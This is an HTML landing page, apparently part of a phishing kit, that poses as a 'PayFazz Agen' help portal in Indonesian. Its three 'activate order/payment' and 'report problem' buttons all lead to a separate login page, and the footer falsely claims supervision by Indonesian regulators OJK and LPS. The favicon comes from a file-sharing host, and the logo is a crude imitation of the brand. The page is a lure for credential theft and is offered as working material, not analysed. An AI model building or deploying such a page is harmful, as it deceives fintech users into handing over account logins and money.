    <link rel="shortcut icon" type="image/jpeg" href="https://files.catbox.moe/e52rnc.jpeg">
    <link rel="apple-touch-icon" href="https://files.catbox.moe/e52rnc.jpeg">

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
        }
        .gif-container {
            max-width: 500px; /* Increased from 400px */
            width: 90%; /* Added to ensure responsiveness */
            margin: 0 auto;
            overflow: hidden;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
        .gif-container img {
            width: 100%;
            height: auto;
            display: block;
            object-fit: contain;
        }
    </style>
</head>
<body class="bg-white">
    <div class="min-h-screen bg-white">
        <!-- Header with optimized GIF -->
        <header class="text-center pt-8 pb-4">
            
        </header>

        <!-- Main Content -->
        <main class="container mx-auto px-4 max-w-md">
            <!-- Updated text colors -->
            <div class="text-center text-gray-600 mb-6">
            </div>

            <!-- FAZZ Logo -->
            <div class="text-center mb-8">
                <div class="inline-flex items-center bg-white rounded-lg px-6 py-3 shadow-lg">
                    <div class="w-8 h-8 bg-blue-500 rounded mr-3 flex items-center justify-center">
                        <span class="text-white font-bold">⚡</span>
                    </div>
                    <span class="text-2xl font-bold text-gray-800">PayFazz</span>
                    <span class="text-sm text-gray-600 ml-2">Agen</span>
                </div>
            </div>

            <!-- Phone Mockup -->
            <div class="text-center mb-8">
                <div class="gif-container">
                <img 
                    src="image/thumb.gif"
                    alt="PAYFAZZ Preview"
                    width="500" /* Increased from 400 */
                    height="500" /* Increased from 400 */
                    loading="eager"
                    decoding="async"
                />
                </div>
            </div>

            <!-- Updated text colors -->
            <div class="text-center text-gray-600 mb-8">
                <p class="text-lg">Silakan Pilih Sesuai Kendalamu Di Bawah ini</p>
            </div>

            <!-- Action Buttons -->
            <div class="space-y-4 mb-8">
                <button onclick="goToLogin('pesanan')" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-6 rounded-lg transition duration-300 shadow-lg">
                    Aktifkan Pesanan
                </button>
                <button onclick="goToLogin('pembayaran')" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-6 rounded-lg transition duration-300 shadow-lg">
                    Aktifkan Pembayaran
                </button>
                <button onclick="goToLogin('kendala')" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-6 rounded-lg transition duration-300 shadow-lg">
                    Laporan Kendala
                </button>
            </div>

            <!-- Updated footer text color -->
            <div class="text-center text-gray-600 mt-20 mb-8">
                <p class="text-sm">© 2025 Terdaftar dan diawasi oleh</p>
            </div>

            <!-- New Section: Images with Links -->
            <div class="text-center pb-8 flex justify-center items-center space-x-8">
                <img src="image/lps.png" alt="Logo LPS" class="h-12 w-auto object-contain">
                <img src="image/ojk.png" alt="Logo OJK" class="h-12 w-auto object-contain">
            </div>
            <!---->

        </main>
    </div>

    <script>
        function goToLogin(type) {
            localStorage.setItem('actionType', type);
            window.location.href = 'login.html';
        }
    </script>
</body>
</html>
